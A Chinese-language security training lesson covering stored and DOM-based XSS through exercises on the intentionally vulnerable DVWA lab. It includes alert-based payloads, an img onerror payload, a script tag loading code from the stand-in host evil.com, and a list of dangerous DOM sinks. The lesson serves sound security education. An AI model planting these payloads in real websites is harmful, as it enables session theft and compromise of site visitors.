---
title: Day023：XSS 跨站脚本 - 存储型与 DOM 型
tags:
  - 网络安全
  - XSS
  - 存储型XSS
categories:
  - 90天安全突击
stage: 筑基
abbrlink: d023
date: 2026-02-14
updated: 2026-01-28
---

# Day023：XSS 跨站脚本 - 存储型与 DOM 型

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 筑基（第一阶段） |
| **所属周次** | Week 4：XSS 与文件上传 |
| **今日主题** | 存储型 XSS 与 DOM 型 XSS |
| **预计时间** | 2.5 小时 |
| **难度等级** | 入门 |

---

## 今日痛点场景

> **场景**：你在某论坛发了一条评论，内容是 `<script>alert(1)</script>`。之后每个访问这个帖子的人都弹窗了！
>
> **问题**：为什么这次不用别人点链接就能中招？这和昨天学的反射型有什么区别？
>
> **今天的任务**：掌握存储型 XSS 和 DOM 型 XSS，理解三种 XSS 的区别。

---

## 今日目标

- [ ] 理解存储型 XSS 的持久性危害
- [ ] 成功在 DVWA 留言板植入 XSS
- [ ] 理解 DOM 型 XSS 的前端特性
- [ ] 能区分三种 XSS 类型

**闯关条件**：在 DVWA 存储型 XSS 模块植入代码，使每次访问都弹窗。

---

## 实战任务（先动手！）

### 任务 1：存储型 XSS 实战（25 分钟）

**环境**：DVWA - XSS (Stored) - Low

**操作步骤**：
1. 进入 XSS (Stored) 模块
2. 这是一个留言板功能
3. Name 填：`Hacker`
4. Message 填：`<script>alert('XSS')</script>`
5. 点击 Sign Guestbook

**关键测试**：
1. 刷新页面，还会弹窗吗？
2. 换一个浏览器访问同一页面，会弹窗吗？
3. 清除浏览器缓存后访问，会弹窗吗？

**记录**：
```
刷新页面：________________
换浏览器：________________
清缓存后：________________
```

---

### 任务 2：窃取所有访客的 Cookie（20 分钟）

**目标**：模拟真实攻击场景

**操作步骤**：
1. 清空之前的留言（点击 Reset DB 或重启 DVWA）
2. 发布一条新留言：
   - Name：`正常用户`
   - Message：`<script>alert(document.cookie)</script>`
3. 让另一个人（或另一个浏览器）访问这个页面

**思考**：
```
这个留言被谁看到？________________
谁的 Cookie 会被弹出？________________
攻击者能看到受害者的 Cookie 吗？________________
```

---

### 任务 3：DOM 型 XSS 体验（20 分钟）

**环境**：DVWA - XSS (DOM) - Low

**操作步骤**：
1. 进入 XSS (DOM) 模块
2. 观察页面功能——选择语言的下拉框
3. 查看 URL：`http://xxx/vulnerabilities/xss_d/?default=English`
4. 修改 URL 为：`?default=<script>alert(1)</script>`
5. 访问修改后的 URL

**对比**：
```
与反射型相比，有什么不同？________________
查看页面源码，payload 在哪里？________________
```

**提示**：DOM 型的 payload 不会出现在服务器返回的 HTML 中。

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 存储型 XSS 植入成功 | 20 分 |
| 理解"持久性"含义 | 15 分 |
| DOM 型 XSS 触发成功 | 20 分 |
| 能区分三种 XSS 类型 | 25 分 |
| 理解为什么存储型更危险 | 20 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 底层补课

### 存储型 XSS vs 反射型 XSS

| 特性 | 反射型 | 存储型 |
|------|--------|--------|
| **Payload 位置** | URL 参数中 | 数据库中 |
| **持久性** | 一次性 | 持久存在 |
| **触发方式** | 点击恶意链接 | 访问正常页面 |
| **影响范围** | 点击者 | 所有访问者 |
| **危害程度** | 中 | 高 |

### 存储型 XSS 原理

```
1. 黑客在评论区提交：<script>恶意代码</script>

2. 服务器把这条"评论"存入数据库

3. 任何用户访问这个页面时：
   - 服务器从数据库读取评论
   - 把评论内容输出到 HTML
   - 恶意代码被执行

4. 每个访客都中招！
```

### DOM 型 XSS 原理

```
1. 页面 JavaScript 代码：
   var lang = location.search.split('=')[1];
   document.getElementById('demo').innerHTML = lang;

2. 用户访问：?default=<script>alert(1)</script>

3. JavaScript 把 URL 参数直接写入页面

4. 弹窗！

注意：服务器完全不知道发生了什么，
payload 从未发送到服务器。
```

### 为什么 DOM 型特殊？

| 特性 | 反射型/存储型 | DOM 型 |
|------|---------------|--------|
| 服务器参与 | 是 | 否 |
| 后端日志 | 有记录 | 无记录 |
| WAF 防护 | 可以拦截 | 难以拦截 |

### 三种 XSS 对比总结

| 类型 | 一句话描述 | 典型场景 |
|------|------------|----------|
| **反射型** | 链接里藏代码 | 搜索框、错误页 |
| **存储型** | 评论里藏代码 | 留言板、个人简介 |
| **DOM 型** | 前端自己作死 | URL 参数直接渲染 |

---

## 避坑指南

| 坑点 | 症状 | 解决方案 |
|------|------|----------|
| Name 字段太短 | 输入被截断 | payload 放到 Message 字段 |
| 特殊字符被过滤 | `<script>` 没了 | 尝试其他标签如 `<img>` |
| DOM XSS 没反应 | 弹窗不出现 | 检查浏览器是否阻止，换 Firefox |

---

## 知识卡片速查

### 存储型 XSS Payload

```html
<!-- 标准弹窗 -->
<script>alert(document.cookie)</script>

<!-- 外链脚本（更隐蔽） -->
<script src="http://evil.com/xss.js"></script>

<!-- 图片标签触发 -->
<img src=x onerror=alert(1)>
```

### DOM XSS 常见位置

```javascript
// 危险的 DOM 操作
document.write(用户输入)
element.innerHTML = 用户输入
eval(用户输入)
location.href = 用户输入
```

### 查找 XSS 的位置

| 位置 | 反射型 | 存储型 | DOM 型 |
|------|--------|--------|--------|
| 搜索框 | ✓ | | |
| 评论区 | | ✓ | |
| 用户名 | | ✓ | |
| URL 参数 | ✓ | | ✓ |
| 文件名 | ✓ | ✓ | |

---

## 常见问题

**Q1：存储型 XSS 为什么更危险？**

A1：
1. **不需要用户点链接**——访问正常页面就中招
2. **影响所有访客**——一个 payload，无数受害者
3. **持久存在**——删除前一直有效
4. **攻击面大**——可以配合蠕虫自动传播

**Q2：DOM 型 XSS 怎么检测？**

A2：
1. 查看页面 JavaScript 源码
2. 找 `document.write`、`innerHTML` 等操作
3. 检查这些操作的数据来源
4. 如果来自 URL/Cookie 等用户可控内容，就可能有漏洞

**Q3：为什么 DOM 型 WAF 拦不住？**

A3：因为 payload 从未发送到服务器。WAF 只能看到正常请求，恶意代码在浏览器本地执行。

---

## 明日预告

**Day 024：XSS 跨站脚本 - 高级利用与绕过**

明天你将：
- 学习绕过过滤的技巧
- 构造更复杂的攻击场景
- 窃取 Cookie 并发送到远程服务器

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 存储型 XSS 成功 | 是/否 |
| DOM 型 XSS 成功 | 是/否 |
| 今日收获 | |

---

> **导师点评**：
>
> 今天你体验了最危险的 XSS 类型——存储型。
>
> 一条评论，让所有访客中招。这就是为什么各大网站对用户输入如此严格。
>
> 而 DOM 型更隐蔽——服务器完全不知道攻击发生了，日志里干干净净。
>
> 记住：**反射型靠钓鱼，存储型靠等待，DOM 型靠无知**。
>
> 三种攻击方式，同一个本质——信任了不该信任的输入。

```bash
echo "Day 023 Complete! 三种 XSS 都试过了！"
```
